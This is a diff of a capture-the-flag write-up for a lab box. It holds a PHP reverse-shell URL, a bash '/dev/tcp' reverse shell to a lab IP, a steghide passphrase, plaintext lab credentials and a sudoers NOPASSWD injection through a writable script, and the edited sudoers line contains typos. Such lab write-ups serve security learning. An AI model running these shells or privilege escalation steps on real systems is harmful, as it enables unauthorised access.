@@ -116,19 +116,25 @@ http://10.10.4.218/assets/index.php?cmd=php%20-r%20%27%24sock%3Dfsockopen(%2210.
 </br> reference to --> `https://en.wikipedia.org/wiki/List_of_file_signatures`
 </br>  JPG starts off as : `FF D8 FF E0 00 10 4A 46 49 46 00 01`
 </br> ![jfifIGuess](https://github.com/user-attachments/assets/a8c18c8d-495a-4d32-bbd9-2db8339d7042)
+![ctrlxSave](https://github.com/user-attachments/assets/6504df1b-03ae-4830-ac66-8dde205f1b75)
 
-</br> `ctrl + x` --> quit editing, be sure to hit "y" to save when the prompt occurs
+</br> `ctrl + x` --> quit editing, be sure to hit "y" to save when the prompt above occurs
 ![passphrase2123213](https://github.com/user-attachments/assets/9d5268b1-f266-44a2-870f-a284b41f5611)
 
 </br> can't open anything as it wants a password
 </br> 
 </br> in typical web enumeration fashion, we search `/var/www` to see what contents we got, and find a hidden dir with a txt file in it.
+![dirWithPassphrase2](https://github.com/user-attachments/assets/d6b11530-2b86-4d5e-a20e-f0e42afb0600)
 
-</br> QWxsbWlnaHRGb3JFdmVyISEhCg==
+</br> decode the base64 --> QWxsbWlnaHRGb3JFdmVyISEhCg==
 </br> echo  QWxsbWlnaHRGb3JFdmVyISEhCg==| base64 -d
+![getThebase64decoded3](https://github.com/user-attachments/assets/73634d52-5475-432c-8988-58c3c7ef01b6)
+
 </br> > AllmightForEver!!!
 </br> thank goodness there's not an auto-termination of file contents on a failure to input the correct passphrase. That would be some supa-hacka hot garbage.
-</br> 
+</br> using the passphrase we can unlock the hidden info using steghide
+![credsinHidden1](https://github.com/user-attachments/assets/bccf2204-501f-44e8-91da-9b41685921eb)
+
 </br> content of creds.txt
 ```
 Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:
@@ -138,22 +144,28 @@ deku:One?For?All_!!one1/A
 
 </br> ssh in with the creds...
 </br> (can now get user.txt)
+![canSSHAfterThat](https://github.com/user-attachments/assets/fd5c2a0b-2858-44fe-89c1-2577c77db07a)
 
 </br> let's not run sudo -l and NOT trip an alarming log...
 </br> `find / -perm -4000 2>/dev/null`
 </br> (should't this command also be configured to trigger an alarm?)
-</br> 
+![nutsr23r23](https://github.com/user-attachments/assets/05d1910e-4e14-4a14-b486-e95059550919)
 </br> nothing i can do or find in /tmp...
 </br> sudo -l WAS the correct escalation path... I hate the mixed messages of what is or isn't best practice, learning one thing from one box doesn't apply to another... 
-</br> 
+</br> within feedback.sh we can write a malicious payload
+</br> as shown below, we can append files from within the call to this feedback.sh input field; below I make the potato file
+
 </br> we can write to a .sh file; header claims it as /bin/bash.
-</br> 
+</br> ![isABashFile](https://github.com/user-attachments/assets/ecc4a089-e2aa-4ce6-970e-81e786472067)
+ </br>
  </br> `bash -i >& /dev/tcp/10.10.152.50/1776 0>&1`
 </br> 
 </br> I can't execute commands, but apparently I can write or append to files with the shovel `>>` operator.
-</br> 
-</br> After some research, I find that I can add my current user to the /etc/sudoers file, giving me su access without needing to enter a password
-</br> 
-</br> deku ALL=NOPASSWD: ALL » /etc/sudoers
-</br> 
+![canoing43](https://github.com/user-attachments/assets/9bbd3b8a-d203-444c-9f04-3c3c56bc0a03)
+</br> `Deku ALL-NOPASSWD: ALL >> /ec/sudoers`
+</br> give user Deku the ability to run anything as superuser without any password.
+ </br>
+</br> sudo /bin/bash to simply become root
 </br> Neat ascii art, btw
+![neatAsciiArt](https://github.com/user-attachments/assets/764e0bc1-496e-4d59-b355-138291415fc4)
+
